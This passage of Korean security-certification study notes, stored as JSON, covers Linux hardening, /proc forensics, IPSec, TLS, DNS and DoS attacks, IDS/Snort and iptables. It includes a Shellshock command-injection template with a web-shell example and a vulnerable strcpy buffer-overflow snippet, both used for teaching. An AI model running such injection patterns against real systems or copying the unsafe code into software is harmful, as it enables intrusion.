중인 프로세스 정보를 기록하는 디렉터리\n\n::보강::\n- **특징** : 디스크에 실재하지 않는 **가상 파일 시스템**. 커널이 메모리 상의 프로세스·시스템 정보를 파일 형태로 실시간 제공\n- **주요 항목**\n  - `/proc/[PID]/` : 각 프로세스별 정보 디렉터리(cmdline·status·fd 등)\n  - `/proc/cpuinfo` : CPU 정보 / `/proc/meminfo` : 메모리 정보\n  - `/proc/net/` : 네트워크 상태(예: `/proc/net/tcp` 열린 포트)\n  - `/proc/sys/` : 커널 파라미터(읽기·쓰기로 튜닝 가능, `sysctl`)\n- **보안 활용** : 은닉 프로세스·비정상 fd(파일 디스크립터)·백도어 포트 탐지에 활용","added":false,"hasAdd":true},{"title":"주요 파일 접근 권한 및 umask","star":false,"body":"- **권장 권한**\n  - `chmod 644 /etc/passwd` (rw-r--r--)\n  - `chmod 400 /etc/shadow` (r--------)\n- **world writable 파일 검출** : `find / -type f -perm -2`\n  - 누구나 쓰기 가능한 파일 → 악의적 변조 위험이 있으므로 발견 시 권한 조정\n- **umask 022** : 기본 생성 권한을 파일 `rw-r--r--`(644), 디렉터리 `rwxr-xr-x`(755)로 설정","added":false},{"title":"SUID / SGID / Sticky Bit (특수 권한 비트)","star":true,"body":"- **SUID (`4000`, 소유자 실행 자리 `s`)** : 파일 실행 시 **소유자(주로 root) 권한**으로 실행\n  - 예: `-r-sr-xr-x root ...` → 일반 사용자가 실행해도 root 권한으로 동작\n- **SGID (`2000`, 그룹 실행 자리 `s`)** : 실행 시 **그룹 권한**으로 실행\n  - 예: `-r-xr-sr-x root mail ...` → 실행 시 mail 그룹 권한으로 동작\n- **Sticky Bit (`1000`, others 실행 자리 `t`)** : 공용 디렉터리에서 **파일 소유자·root만 삭제 가능**\n  - 예: `drwxrwxrwt ... /tmp` → 누구나 생성·쓰기는 가능하나 **본인 파일만 삭제 가능**\n- **점검** : `find / -user root -type f \\( -perm -4000 -o -perm -2000 \\) -xdev -exec ls -al {} \\;`\n- **조치** : `chmod -s [파일]` 로 불필요한 SUID/SGID 제거 (부적절 시 root 권한 획득 위험)","added":false},{"title":"r-command 보안 조치 (rsh, rlogin, rexec)","star":false,"body":"- 대상 파일 : `/etc/hosts.equiv`, `$HOME/.rhosts`\n- **소유자 변경** : root 또는 해당 계정으로 변경\n- **권한 변경** : `600` 이하로 변경\n- **'+' 제거** : `+`(모든 호스트 허용) 제거 후 허용 호스트·계정만 등록","added":false},{"title":"xinetd 서비스 설정 (telnet / tftp)","star":false,"body":"- `only_from = 192.168.10.0/24` : 접속 허용 대상 네트워크\n- `no_access = 10.0.0.0/24` : 접속 차단 대상 네트워크\n- `instances = 3` : 동시 실행 가능한 서버 프로세스 최대 개수\n- `access_time = 09:00-18:00` : 서비스 접속 허용 시간대\n- `disable = yes` : 해당 서비스 **비활성화** (예: `xinetd.conf`/`xinetd.d/tftp`에서 tftp 서비스 차단)","added":false},{"title":"배너 정보 노출 취약점 (Banner Grabbing)","star":false,"body":"- **정의** : telnet·ftp 접속 시 서버 OS/서비스 버전이 노출되는 취약점\n- **위험성** : 노출된 버전의 알려진 취약점을 공격자가 악용\n- **조치**\n  - Telnet : `/etc/issue.net` 에 경고 메시지 입력하여 버전 정보 대체\n  - FTP : `/etc/vsftpd/vsftpd.conf` 의 `ftpd_banner=\"경고 메시지\"` 설정","added":false},{"title":"리눅스 파일 권한(rwx) 8진수 계산","star":true,"body":"- **권한 표기** : `r`(읽기,4) / `w`(쓰기,2) / `x`(실행,1) — 소유자·그룹·기타(other) 3자리\n- **예시 계산**\n  - `rwxr-xr--` = 소유자 7(4+2+1) / 그룹 5(4+1) / 기타 4(4) → **754**\n  - `rw-r--r--` = 6/4/4 → **644** (일반 파일 권장)\n  - `rwx------` = 7/0/0 → **700**\n- **chmod 예** : `chmod 750 file` → 소유자 rwx, 그룹 r-x, 기타 없음","added":true},{"title":"크론(cron) / at 스케줄러 보안","star":false,"body":"- **정의** : 반복 작업(cron), 1회 예약 작업(at)을 실행하는 스케줄러\n- **크론탭 필드** : `분 시 일 월 요일 [명령어]` (예: `0 3 * * * /backup.sh` = 매일 03:00)\n- **접근 제어 파일** : `cron.allow`(허용 사용자), `cron.deny`(차단 사용자) → allow 파일 존재 시 allow에 등록된 사용자만 사용 가능\n- **보안 점검** : 불필요한 크론 작업·백도어 등록 여부 확인 (`crontab -l`, `/etc/crontab`)","added":true}]},{"title":"Linux/Unix — 쉘 · 메모리 · 컴파일","items":[{"title":"쉘 (Shell)","star":false,"body":"- **정의** : 사용자가 입력한 명령어를 읽어 해석하는 프로그램(명령어 해석기)\n- **주요 기능**\n  - 명령어 해석기 : 명령을 커널이 이해하도록 해석·전달\n  - 프로그래밍 : 스크립트로 반복 작업 자동화\n  - 사용자 환경설정 : 환경 변수·프롬프트 등 작업 환경 설정","added":false},{"title":"Bash 환경변수 공격 (Shellshock)","star":false,"body":"- **대상 명령** : `env VAR='() { :; }; [악성명령]' bash -c \"...\"`\n- **정의** : Bash 환경변수에 함수 정의 시 정의 뒤의 명령까지 실행되는 취약점을 악용\n- **결과 예시** : 웹 서버 접근 가능 디렉터리(`/var/www/html/shell.php`)에 웹 쉘을 생성 → `cmd` 파라미터로 원격 명령 실행","added":false},{"title":"C언어 버퍼 오버플로우","star":false,"body":"- **대상 코드**\n  ```c\n  char p[4];\n  strcpy(p, argv[1]);\n  ```\n- **정의** : 4byte 버퍼에 길이 검사 없이 `strcpy`로 복사하여 인접 메모리를 덮어쓰는 취약점\n- **위험성** : 스택 손상, 비정상 종료, 임의 코드 실행\n- **대응** : `strncpy` 등 길이 제한 함수 사용, 입력값 길이 검증","added":false},{"title":"64비트 리눅스 함수 호출 규약","star":false,"body":"- **개요** : 정수·포인터 매개변수를 스택 대신 레지스터에 우선 할당하여 호출 속도 향상\n- **정수형 매개변수 레지스터 순서** : `RDI → RSI → RDX → RCX → R8 → R9`","added":false},{"title":"동적 라이브러리 (PLT / GOT)","star":false,"body":"- **동적 링킹** : 라이브러리 코드를 실행 파일에 포함하지 않고, 런타임에 외부 공유 라이브러리를 메모리에 로드·연결하는 방식\n- **PLT (Procedure Linkage Table)** : 외부 함수 호출 시 실제 주소로 점프하기 위한 코드 테이블. GOT를 참조하거나 dynamic linker를 호출해 주소를 찾음\n- **GOT (Global Offset Table)** : 외부 함수의 실제 주소가 저장되는 테이블. 처음엔 dynamic linker 주소를 가리키다가, 첫 호출 시점(Lazy Binding)에 실제 주소를 바인딩·저장","added":false},{"title":"/proc 기반 침해 대응 (백도어 분석)","star":true,"body":"- 상황 : `ls -al /proc/[PID]` 결과 `exe -> [백도어경로 (deleted)]` — 실행 후 파일이 삭제되어 경로에 파일이 없음\n- **① 파일이 안 보이는 이유** : 공격자가 백도어 **프로세스 실행 후 원본 파일을 삭제**했기 때문 (프로세스는 메모리에서 계속 실행 중)\n- **② 삭제된 실행 파일 복원** : `cp /proc/[PID]/exe /tmp/backdoor`\n- **③ 공격자가 사용한 명령 확인** (`ps`가 변조되어 사용 불가한 경우)\n  - `cat /proc/[PID]/cmdline` : 프로세스 실행 시 사용한 명령어·인자 확인\n  - `history` : 로그인 후 입력한 명령어와 파라미터 확인 (history 삭제 시 cmdline 참조)\n  - ※ `lsof`는 숨은 프로세스 확인은 가능하나 **입력 명령어 확인은 불가** → 정답 아님","added":false},{"title":"strace (시스템 콜 추적)","star":false,"body":"- 프로그램이 실행하는 **시스템 콜을 추적**하고, 바이너리의 컴파일 경로 정보로 진단·디버깅하는 명령어\n- 트로이목마 감염 파일과 정상 파일 구분에 활용 (예: `strace -e trace=open ps`)","added":false},{"title":"루트킷 (Rootkit)","star":false,"body":"- **정의** : 시스템 침입 후 **관리자 권한 획득 및 탐지 회피**를 목적으로 시스템 명령어·라이브러리·커널을 변조하는 악성 프로그램 집합\n- **유형**\n  - **응용 레벨 루트킷** : `ps`, `ls`, `netstat` 등 시스템 명령어(바이너리) 변조\n  - **커널 레벨 루트킷** : 커널 모듈(LKM)을 변조하여 더 은밀·강력 (탐지 어려움)\n- **탐지** : chkrootkit, rkhunter 등 무결성 검사 도구 활용","added":true}]}]},{"num":2,"title":"네트워크 보안","sections":[{"title":"프로토콜 · 기초","items":[{"title":"TCP 헤더 플래그 비트","star":false,"body":"- **URG** : 긴급 데이터 전달 시 사용\n- **ACK** : 패킷 수신 확인 통보\n- **PSH** : 빠른 응답이 필요할 때 데이터를 7계층으로 즉시 전송\n- **RST** : 비정상 연결을 강제 종료\n- **SYN** : 초기 세션 설정\n- **FIN** : 세션 연결 정상 종료","added":false},{"title":"IPSec (IP Security)","star":false,"body":"- **정의** : OSI 3계층(네트워크 계층)에서 IP 패킷을 암호화·인증하여 기밀성·무결성·인증을 보장하는 국제 표준 통신 규약\n- **프로토콜**\n  - **AH (Authentication Header)** : 데이터 **무결성 + 송신자(근원지) 인증** 제공\n    - 페이로드를 **암호화하지 않으므로 기밀성은 미제공** ★\n    - 헤더 구성 : Next Header, Payload Length, SPI, **Sequence Number** 등\n    - **Sequence Number** : 재전송 공격(Replay Attack) 방지를 위한 **32비트** 필드\n  - **ESP (Encapsulating Security Payload)** : 데이터 인증 + 무결성 + **기밀성(암호화)**\n  - **IKE** : 암호화 키 분배\n- **제공 보안서비스** : 무결성 / 기밀성 / 데이터 근원지 인증 / 재전송 공격 방지\n- **전송 모드**\n  - **Transport Mode** : IP 페이로드(데이터)만 암호화, 호스트 간(End-to-End) 통신\n  - **Tunnel Mode** : IP 헤더 포함 전체 패킷 암호화 후 새 IP 헤더 추가, 게이트웨이 간(VPN) 통신\n- **AH / ESP 모드별 인증·암호화 구간** ★\n  - **AH 전송모드** : 인증 = IP 헤더 중 변경 가능 필드(TTL·Checksum 등) 제외한 **IP 패킷 전체** / 암호화 = 없음\n  - **AH 터널모드** : 인증 = New IP 헤더 중 변경 가능 필드 제외한 **New IP 패킷 전체** / 암호화 = 없음\n  - **ESP 전송모드** : 인증 = ESP 헤더 + 암호화 데이터(IP Payload + ESP Trailer) / 암호화 = **IP Payload + ESP Trailer**\n  - **ESP 터널모드** : 인증 = ESP 헤더 + 암호화 데이터(원본 IP 전체 + ESP Trailer) / 암호화 = **원본 IP 패킷 전체 + ESP Trailer**\n- **ESP 터널모드 패킷 구조** (원본: `[IP][TCP][데이터]`)\n  - `[New IP][ESP헤더][IP][TCP][데이터][ESP Trailer][ESP Auth]`\n  - 암호화 범위 : `[IP][TCP][데이터][ESP Trailer]`\n  - 인증 범위 : `[ESP헤더][IP][TCP][데이터][ESP Trailer]`\n- **제공 보안서비스** (3개 이상 서술 시) : 기밀성 / 데이터 근원지 인증 / 비연결형 무결성 / 접근제어 / 재전송 공격 방지 / 제한된 트래픽 흐름의 기밀성","added":false},{"title":"SSL/TLS 핸드셰이크  (서술형 빈출)","star":true,"body":"- **위치** : OSI **전송 계층(Transport Layer)**에서 보안을 제공\n- **핵심 과정** (Client Hello / Server Hello 완료 이후)\n  1. **Server Certificate** : 서버가 인증서를 전달 → 클라이언트가 **서버의 공개키** 획득\n  2. **Client Key Exchange** : 클라이언트가 생성한 **암호키(pre-master secret)**를 **서버의 공개키로 암호화**하여 전달\n  3. **세션 키 생성** : 클라이언트와 서버가 동일한 **세션 키(대칭키)**를 각각 생성\n  4. **데이터 전송** : 핸드셰이크 종료 후 실제 데이터를 **세션 키로 암호화**하여 송수신\n- **암호 방식별 사용 지점 (핵심 답안)**\n  - **비대칭키(공개키) 암호화** : Server Certificate 단계에서 받은 **서버 공개키**로, 클라이언트가 생성한 **암호키를 암호화하여 전달**할 때 사용 → **키 교환**\n  - **대칭키 암호화** : 클라이언트와 서버가 동일하게 생성한 **세션 키**로, 핸드셰이크 종료 이후 **실제 데이터를 암호화**하여 주고받을 때 사용 → **속도**","added":false},{"title":"DNS (Domain Name System)","star":false,"body":"- **정의** : 도메인 이름 ↔ IP 주소 변환 프로토콜\n- **포트**\n  - **UDP 53** : 일반 질의·응답 (연결 설정 없어 빠름, 패킷 512byte 이하)\n  - **TCP 53** : 응답이 512byte 초과 시 또는 존 전송(Zone Transfer) 동기화 시 신뢰성 확보용\n- **부하 감소 메커니즘**\n  - **DNS 캐싱** : 상위(Root/TLD) 서버 집중 부하 감소\n  - **TTL** : 캐시 레코드 유효 기간(초). 유효 기간 내면 캐시에서 즉시 응답","added":false},{"title":"BIND DNS Zone 설정 (named.conf)","star":false,"body":"- **Master 설정**\n  ```\n  zone \"soojebi.co.kr\" IN {\n      type master;\n      file \"ns.soojebi.co.kr.zone\";\n      allow-transfer { 192.168.2.53; };\n  };\n  ```\n  - `allow-transfer` : 지정된 Slave로만 존 전송 허용(무분별한 존 전송 방지)\n- **Slave 설정**\n  ```\n  zone \"soojebi.co.kr\" IN {\n      type slave;\n      file \"slaves/ns.soojebi.co.kr.zone\";\n      masters { 192.168.1.53; };\n  };\n  ```\n  - `type slave` : 주 서버에서 읽어오는 보조 네임 서버\n  - `masters` : 동기화해 올 Master IP 지정","added":false},{"title":"VLAN (Virtual LAN)","star":false,"body":"- **정의** : 물리적 구성과 무관하게 논리적으로 네트워크를 분할하는 기술\n- **할당 방식**\n  - **포트 기반 VLAN (정적)** : 1계층에서 스위치 포트 단위로 구성. 가장 많이 사용\n  - **MAC 기반 VLAN (동적)** : 2계층에서 MAC 주소 기반으로 관리 서버 정책에 따라 자동 할당\n- **확인 명령어** : `show vlan` (CISCO 스위치)","added":false},{"title":"LAN 스위치 전송방식","star":false,"body":"- **Cut Through** : 목적지 주소만 확인 후 바로 전송 (빠름, 오류 검출 X)\n- **Store and Forward** : 전체 프레임 수신 후 오류 검출 → 전달 (느림, 신뢰성↑)\n- **Fragment Free** : 앞 64byte만 읽어 에러 처리 후 전송 (절충형)","added":false},{"title":"스위칭 허브 동작 원리  (L2 기준)","star":true,"body":"1. **Learning** : 출발지 MAC과 수신 포트 번호의 매핑을 **MAC Address Table**에 저장\n2. **Forwarding** : 목적지 MAC이 테이블에 **있으면** 해당 포트로만 전달\n3. **Filtering** : 출발지·목적지가 같은 세그먼트면 다른 포트로 넘기지 않음\n4. **Flooding** : 목적지 MAC이 테이블에 **없으면** 수신 포트를 제외한 모든 포트로 브로드캐스트\n5. **Aging** : 설정 시간(예: 300초) 동안 갱신 없으면 테이블 항목 삭제","added":false},{"title":"무선 LAN 보안 표준 (WEP / WPA / WPA2)","star":true,"body":"- **WEP** : 암호화 알고리즘 **RC4** (취약)\n- **WPA** : **TKIP** (RC4 기반 개선)\n- **WPA2** : **AES + CCMP**, IEEE **802.11i** 표준 기반, 802.1x/EAP 인증 체계 제공","added":false},{"title":"VPN 터널링 프로토콜","star":true,"body":"- **L2F** : Cisco 개발, 데이터링크 계층(2계층) 캡슐화\n- **PPTP** : MS·3Com 등 공동 개발\n- **L2TP** : L2F + PPTP 결합 (2계층)\n- **IPSec** : OSI **3계층**에서 보안을 제공하는 표준 프로토콜","added":false},{"title":"SNMP 보안 설정","star":false,"body":"- **SNMPv3 사용** : 보안 수준이 높은 v3 권고\n- **Community String** : 유추 어려운 값으로 설정\n- **ACL 설정** : SNMP 접근에 대한 Access List 설정\n- **읽기 전용** : Community 권한을 RO(Read Only)로 설정","added":false},{"title":"TCP 3-way / 4-way 핸드셰이크","star":true,"body":"- **3-way handshake (연결 수립)**\n  1. Client → Server : **SYN** (seq=x)\n  2. Server → Client : **SYN + ACK** (seq=y, ack=x+1)\n  3. Client → Server : **ACK** (ack=y+1) → 연결 성립(ESTABLISHED)\n- **4-way handshake (연결 종료)**\n  1. Client → Server : **FIN**\n  2. Server → Client : **ACK**\n  3. Server → Client : **FIN**\n  4. Client → Server : **ACK** → 연결 종료\n- **관련 공격** : SYN Flooding(3-way 미완성 악용), 세션 하이재킹","added":true}]},{"title":"네트워크 공격","items":[{"title":"세션 하이재킹","star":false,"body":"- TCP 통신 중 **RST 패킷**을 보내 세션을 일시 중단하고, 시퀀스 넘버를 새로 생성해 세션을 탈취 후 인증 우회\n\n::보강::\n- **개념** : 정상 사용자가 인증을 마친 **세션을 가로채** 인증 과정 없이 서버에 접근하는 공격\n- **유형**\n  - **TCP 세션 하이재킹** : 시퀀스 넘버를 추측·조작해 연결 탈취(스니핑+스푸핑 결합)\n  - **애플리케이션(웹) 세션 하이재킹** : XSS·스니핑으로 **세션 ID(쿠키)** 탈취\n- **탐지 징후** : 비동기화 상태(ACK Storm), 예상치 못한 RST/재전송 급증\n- **대응** : 세션 구간 **암호화(SSL/TLS)**, 세션 ID의 지속적 재생성, 세션 타임아웃, **HttpOnly·Secure** 쿠키 속성, MAC 주소 고정","added":false,"hasAdd":true},{"title":"스니핑 공격 / Promiscuous Mode","star":true,"body":"- **개념** : 네트워크에서 전송되는 패킷을 훔쳐보는 도청 공격. NIC를 **무차별 모드(Promiscuous Mode)**로 설정해 본인에게 오지 않는 패킷까지 수신\n  - 로그 예: `device eth0 entered Promiscuous mode` → 해당 인터페이스로 들어오는 **모든 패킷을 Drop하지 않고 수신**\n- **탐지 기법**\n  1. **Ping** : 존재하지 않는 MAC으로 위장한 Ping에 응답하는 호스트 탐지\n  2. **ARP** : 위장 ARP Request에 응답하는 호스트 확인\n  3. **프로그램** : Sentinel 등 모니터링 프로그램 활용\n- **대응 방안**\n  - **암호화 통신** : SSH·HTTPS 등으로 평문 노출 방지 (가장 능동적)\n  - **무차별 모드 해제** : `ifconfig [인터페이스] -promisc` (단, 공격자가 자신의 NIC를 설정한 경우엔 무효)\n  - **지능형 스위치** 운용으로 불필요한 브로드캐스트 최소화","added":false},{"title":"ARP 스푸핑 / ARP 리다이렉트","star":true,"body":"- **ARP 개요** : 목적지 **IP에 대응하는 MAC 주소**를 얻기 위한 프로토콜. ARP Request는 **브로드캐스트**로 보내고, 해당 IP 호스트가 **유니캐스트**로 자신의 MAC을 응답\n  - ARP Request 시 목적지 MAC 주소 형식 : **`ff:ff:ff:ff:ff:ff`** (브로드캐스트)\n- **ARP 스푸핑** : **Victim(피해자)의 MAC 주소로 위조**한 위조 ARP 응답을 보내, 해당 IP로 가는 데이터를 중간에서 가로채는 공격\n- **ARP 리다이렉트** : **게이트웨이(라우터)의 MAC 주소로 위조**하여, 같은 네트워크의 트래픽이 공격자를 경유하도록 유도\n- **공통 목적** : 스니핑·중간자(MITM) 공격","added":false},{"title":"DoS 기본 유형 (Land / Smurf / SYN Flooding)","star":true,"body":"- **Land Attack** : 출발지와 목적지 IP를 **모두 공격 대상의 IP로 동일하게** 설정하여 전송 → 자기 자신에게 무한 응답\n- **Smurf Attack** : 출발지 IP를 피해자로 위조하고 **브로드캐스트 주소로 ICMP Echo Request** 전송 → 다수 호스트의 응답이 피해자에 집중\n- **TCP SYN Flooding** : 다수의 **SYN 패킷**만 전송하고 응답하지 않아 서버의 연결 대기 큐(Backlog)를 고갈","added":false},{"title":"Smurf 공격 상세","star":false,"body":"- **원리** : 출발지 IP 위조(Spoofing) + 브로드캐스트 증폭(Amplification)\n- **대응**\n  - 라우터에서 **Directed Broadcast 차단** : `no ip directed-broadcast`\n  - 각 호스트가 브로드캐스트 ICMP Echo Request에 응답하지 않도록 설정\n  - (신뢰 대역만 허용 예시)\n    ```\n    (config)# access-list 100 permit udp 192.168.1.0 0.0.0.255 any\n    (config)# interface FastEthernet 0/0\n    (config-if)# ip directed-broadcast 100\n    ```","added":false},{"title":"DNS 스푸핑 / 캐시 포이즈닝","star":true,"body":"- **DNS 스푸핑** : **중간자(MITM)** 방식의 하나로, 정상 DNS 서버보다 **빠른 응답**을 보내 DNS 응답을 조작 → 사용자를 **의도하지 않은(악성) 웹사이트로 접속**하게 만드는 공격\n- **DNS 캐시 포이즈닝** : DNS **캐시에 위조 정보를 주입**하여 가짜 사이트로 접속을 유도\n- **대응** : **DNSSEC**(응답 무결성 검증), 신뢰할 수 있는 DNS 서버 사용","added":false},{"title":"도메인 악용 공격","star":true,"body":"- **DGA (Domain Generation Algorithm)** : 악성코드가 특정 규칙으로 **C&C 도메인명을 지속적으로 자동 생성·변경** → Reputation 기반 탐지 우회\n- **서브도메인 테이크오버(Takeover)** : 클라우드 서비스 종료 후 **CNAME 레코드를 삭제하지 않아**, 공격자가 해당 서브도메인을 피싱 사이트로 악용\n- **Domain Shadowing** : 도메인 관리자 계정을 탈취해 소유자 몰래 다수의 서브도메인을 등록·악용","added":false},{"title":"DNS 증폭 공격","star":false,"body":"- **개념** : 송신자 주소를 위조해 대량의 DNS 쿼리를 서버에 전송하는 공격\n- **사용 이유** : 작은 질의로 큰 응답을 유발(증폭). DNS는 인증 절차가 없어 변조된 질의에도 응답\n- **질의 유형** : **ANY** 유형 사용 (응답 크기가 큼)","added":false},{"title":"NTP DDoS 공격 대응","star":false,"body":"- NTP 서버 버전 업그레이드\n- 업그레이드 불가 시 **monlist 기능 비활성화**\n- 방화벽에서 인가되지 않은 외부 트래픽 및 비정상 NTP 패킷 차단","added":false},{"title":"Slow HTTP DoS 계열","star":true,"body":"- **Slowloris (Slow HTTP Header)** : HTTP 헤더의 **CRLF(개행) 필드를 조작**하여 미완성 헤더를 지속 전송 → 연결을 오래 유지시켜 자원 고갈\n- **RUDY (Slow HTTP POST)** : POST 요청의 **Content-Length를 매우 크게** 설정한 뒤 body를 **1바이트씩 분할 전송** → 서버가 데이터 도착까지 대기하며 자원 고갈\n  - 근거 판단 : ①큰 Content-Length ②body를 잘게 쪼개 전송\n- **Slow Read** : **TCP 윈도우 크기를 작게** 설정하여 응답 데이터를 천천히 읽어 연결 유지\n- **공통 대응** : 연결 타임아웃·읽기 타임아웃 설정, 동일 IP의 동시 연결 수 임계치 설정(iptables)","added":false},{"title":"Reflection / Amplification DDoS","star":true,"body":"- **DRDoS (분산 반사)** : 출발지 IP를 피해자로 위조 → 다수 **반사 서버**에 요청 → 응답이 피해자에 집중\n  - 기존 DoS와 차이 : 출처 파악 어려움, 좀비 PC 없이도 대량 트래픽 생성\n  - **대응 — Unicast RPF** : 인입 패킷의 출발지 IP에 대한 **역경로(Reverse Path)**가 라우팅 테이블에 없으면 위조로 판단·차단\n- **Memcached DDoS** : 인터넷에 노출된 **Memcached 서버(캐시 솔루션)**를 반사체로 악용 (GitHub 공격 사례)\n- **SSDP DRDoS** : **UDP 1900 포트**의 SSDP(UPnP)를 악용, **IoT 기기**를 반사체로 이용\n- **DNS 증폭** : 아래 [DNS 증폭 공격] 참조","added":false},{"title":"HTTP Cache-Control 공격","star":false,"body":"- **개념** : 대량의 `max-age=0` 또는 `no-cache` 헤더를 포함한 GET 요청을 지속적으로 보내는 DDoS\n- **Cache-Control: max-age=0** : 캐시 유효 기간을 0으로 지정 → 매 요청마다 원본 서버 접근\n- **영향** : 캐시 서버를 무력화하여 웹 서버에 부하 집중 → 지연·다운","added":false},{"title":"TEMPEST","star":false,"body":"- 전자 방사를 통해 민감한 정보를 도청·유출하는 것을 방지하는 기술\n\n::보강::\n- **개념** : 컴퓨터·모니터·케이블 등에서 방출되는 **전자기 방사(EM 신호)**를 원거리에서 수신·복원해 정보를 훔치는 것, 또는 이를 **차폐**하는 기술의 총칭\n- **대응 기술**\n  - **차폐(Shielding)** : 전자파 차폐실·차폐 케이스로 방사 차단\n  - **필터링/저방사 장비** : TEMPEST 인증 장비 사용\n  - **Zone 설정** : 민감 장비를 외부와 물리적 이격","added":false,"hasAdd":true},{"title":"포트 스캔 기법 (Open/Half-Open/Stealth)","star":true,"body":"- **TCP Open Scan (Full)** : 3-way handshake 완성 → 정확하나 **로그에 남음**\n- **TCP Half-Open (SYN) Scan** : SYN 전송 후 SYN/ACK 받으면 즉시 RST로 끊음 → **로그 회피**, Open이면 SYN/ACK / Closed면 RST\n- **Stealth Scan (FIN/NULL/XMAS)** : 플래그를 비정상 조합으로 전송\n  - **FIN Scan** : FIN만 전송 / **NULL Scan** : 모든 플래그 off / **XMAS Scan** : FIN+PSH+URG on\n  - Open 포트 = **무응답** / Closed 포트 = **RST** 응답 (Windows는 이 규칙 안 따름)\n- **UDP Scan** : 응답 없으면 Open 추정, ICMP Unreachable 오면 Closed","added":true},{"title":"Ping of Death / Teardrop","star":false,"body":"- **Ping of Death** : 규격(65,535byte)을 초과하는 **비정상적으로 큰 ICMP 패킷**을 단편화하여 전송 → 재조합 시 버퍼 오버플로우로 시스템 다운\n- **Teardrop** : IP 단편화 시 **Fragment Offset 값을 겹치거나 조작**하여 전송 → 재조합 과정에서 오류 유발·시스템 다운\n- **대응** : OS 패치, 비정상 패킷 필터링","added":true}]},{"title":"방어 · 도구","items":[{"title":"IDS (침입탐지시스템)","star":false,"body":"- **종류**\n  - **호스트 기반(HIDS)** : 서버에 직접 설치, 로그·파일 무결성으로 침입 탐지 (관리자 권한 탈취 등)\n  - **네트워크 기반(NIDS)** : 무차별 모드로 패킷을 수집·분석하여 탐지\n- **탐지 방법** ★\n  - **오용 탐지(Misuse) = 지식 기반** : 미리 등록된 **공격 패턴(시그니처)** 기반으로 탐지. 오탐 낮음, 알려지지 않은 공격 탐지 불가\n  - **이상 탐지(Anomaly) = 행위 기반** : 정상·이상 행위를 **프로파일링**하여 통계적으로 탐지. 미탐 낮음, 오탐 높음, 알려지지 않은 공격 탐지 가능\n- **탐지 오류**\n  - **오탐(False Positive)** : 정상 행위를 공격으로 잘못 판단\n  - **미탐(False Negative)** : 공격을 정상으로 잘못 판단\n- **IDS vs IPS 배치 이유** ★\n  - **IPS** : 실시간 **차단** 목적 → **인라인(In-line)** 방식, 외부·내부 **접점**에 배치. 장애 시 대비 **Bypass** 기능 필요\n  - **IDS** : **탐지** 목적 → **포트 미러링** 방식, **내부망**에 배치. 업무 트래픽에 영향 없이 패킷 분석 (IPS를 내부망에 두면 오탐으로 정상 통신 차단 위험)\n- **Suricata** : 오픈소스 IDS/IPS. Snort의 장점을 수용하고 **멀티스레딩·하드웨어 가속**으로 대용량 트래픽 실시간 처리에 특화 (OISF 개발)\n- **침입 감지 시 대응**\n  1. 공격 패턴 탐지 시 관리자에게 즉시 경고\n  2. 의심 행위 감지 시 해당 세션 차단\n  3. 실시간 침입 탐지 수행\n  4. 탐지 이벤트 기록 → 분석 및 감사 로그로 활용","added":false},{"title":"Snort 임곗값 설정 (Threshold)","star":false,"body":"- **정의** : 대량 패킷·반복 이벤트 발생 시 과도한 경고 트래픽을 제어하는 옵션\n- **문법** : `threshold: type <유형>, track <by_src|by_dst>, count <횟수>, seconds <시간>`\n  - `by_src` : 출발지 IP 기준 / `by_dst` : 목적지 IP 기준\n- **Type 3종**\n  - **limit** : 지정 시간 동안 최초 N번만 경고, 나머지 무시\n  - **threshold** : 지정 시간 동안 count 충족되는 순간 1번만 경고 (지속 공격 탐지)\n  - **both** : limit + threshold 결합. count 충족 시 경고 후 이후 추가 경고는 제한\n- **탐지 룰 오작성 시 문제점**\n  - **오탐 (False Positive) 증가** : 정상적인 접근을 비정상(공격)으로 잘못 판단\n  - **미탐 (False Negative) 증가** : 비정상적인 접근(공격)을 정상으로 잘못 판단","added":false},{"title":"iptables","star":false,"body":"- **INPUT Chain** : 외부에서 들어오는 수신 패킷 제어\n- **FORWARD Chain** : 자신을 경유하여 다른 목적지로 전달되는 패킷 제어\n- **OUTPUT Chain** : 외부로 나가는 패킷 제어\n- **룰 예시** : `iptables -A INPUT -p tcp ! --syn -m state --state NEW -j LOG --log-prefix \"[Faked NEW request]\"`\n  - 신규(NEW) 연결 패킷의 Flag가 SYN이 아닌 경우 로그 기록\n- **외부 Ping(ICMP) 차단** ★ : `iptables -A INPUT -p icmp --icmp-type 8 -j DROP`\n  - `-p icmp` : 프로토콜 지정\n  - `--icmp-type 8` (= `echo-request`) : 외부에서 들어오는 Ping 요청\n  - `-j DROP` : 패킷을 응답 없이 폐기","added":false},{"title":"정보보안 도구","star":false,"body":"- **hping3** : TCP/UDP/ICMP 지원 패킷 생성·분석 툴 (DoS 공격 가능)\n- **Nessus** : Tenable사의 취약점 진단 도구 (패스워드 취약점 등 점검)\n- **Tripwire** : 파일 무결성 점검 대표 도구","added":false},{"title":"TCP ACK 스캔","star":true,"body":"- **목적** : 포트의 Open 여부가 아닌, **방화벽의 필터링(룰셋) 여부** 판별\n- **판별** : ACK 패킷 전송 후 → **RST 응답** = 필터링 안 됨(비상태형 방화벽 통과) / **무응답·ICMP** = 필터링 됨\n- 주의 : 포트 Open 여부 판단 목적이라고 서술하면 감점","added":false},{"title":"패킷 필터링 방화벽","star":true,"body":"- **Ingress 필터링** : 인터넷에서 사용되지 않는(존재하지 않는) IP 대역의 인입 차단 → 스푸핑 대응\n- **Tiny Fragment 공격** : 패킷을 매우 작게 단편화하여 **재조합 기능이 없는 방화벽**의 탐지를 우회 (포트 번호가 첫 조각에 안 들어가도록 분할)\n  - 대응 : 재조합 기능 있는 방화벽 사용, 포트 번호 없을 정도로 분할된 패킷은 IDS/IPS에서 차단\n- **일반 vs Stateful**\n  - 일반 : IP·Port 헤더만 단순 검사(빠르나 Tiny Fragment 등에 취약)\n  - **Stateful Inspection** : 연결 **상태(세션) 정보를 저장·추적** → Establish되지 않은 위조 패킷 차단 등 정교한 방어","added":false},{"title":"NAC (Network Access Control)","star":true,"body":"- **정의** : 네트워크 진입 시 단말·사용자를 인증하고, 단말의 보안 취약점을 **지속 점검·통제**하는 솔루션\n- **물리적 구성**\n  - **인라인(In-line)** : 트래픽 경로에 배치. 실시간 차단 유리, 물리적 재구성 필요, **SPOF 위험**\n  - **아웃오브밴드(Out-of-band)** : 미러링 포트로 연결. 구축 용이·서비스 영향 적음, 실시간성은 떨어짐","added":false},{"title":"Race Condition (경쟁 조건)","star":false,"body":"- 여러 프로세스가 **공유 자원에 동시 접근**할 때 접근 순서에 따라 비정상 결과가 발생하는 상황을 악용하는 공격 (예: 심볼릭 링크 + SetUID)\n\n::보강::\n- **대표 유형** : 